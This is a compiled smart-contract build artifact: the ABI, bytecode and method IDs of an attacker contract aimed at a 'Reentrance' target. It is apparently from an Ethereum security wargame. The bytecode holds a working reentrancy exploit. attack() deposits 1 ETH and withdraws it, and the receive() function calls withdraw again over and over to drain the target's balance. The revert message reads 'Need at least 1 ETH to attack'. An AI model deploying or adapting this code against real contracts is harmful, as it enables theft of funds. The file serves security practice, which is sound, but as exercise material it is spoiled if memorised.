{"abi":[{"type":"constructor","inputs":[{"name":"reentranceAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"reentrance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"},{"type":"function","name":"refund","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b5060405161034c38038061034c8339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556102e7806100656000396000f3fe6080604052600436106100375760003560e01c80622a3bb1146100c1578063590e1ae3146100f25780639e5faafc14610107576100bc565b366100bc5760005460016001600160a01b0390911631106100ba576000805460408051632e1a7d4d60e01b8152670de0b6b3a7640000600482015290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b1580156100a157600080fd5b505af11580156100b5573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100cd57600080fd5b506100d661010f565b604080516001600160a01b039092168252519081900360200190f35b3480156100fe57600080fd5b506100ba61011e565b6100ba61014d565b6000546001600160a01b031681565b60405133904780156108fc02916000818181858888f1935050505015801561014a573d6000803e3d6000fd5b50565b670de0b6b3a76400003410156101c457604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b000000604482015290519081900360640190fd5b60008054604080517e362a9500000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b039092169262362a9592670de0b6b3a764000092602480820193929182900301818588803b15801561022e57600080fd5b505af1158015610242573d6000803e3d6000fd5b50506000805460408051632e1a7d4d60e01b8152670de0b6b3a7640000600482015290516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561029757600080fd5b505af11580156102ab573d6000803e3d6000fd5b5050505056fea264697066735822122020a6413990dd0f70a8a05427ac0d61dc756576206699cd9b7d3305075657a9b064736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","reentrance()":"002a3bb1","refund()":"590e1ae3"},"id":1}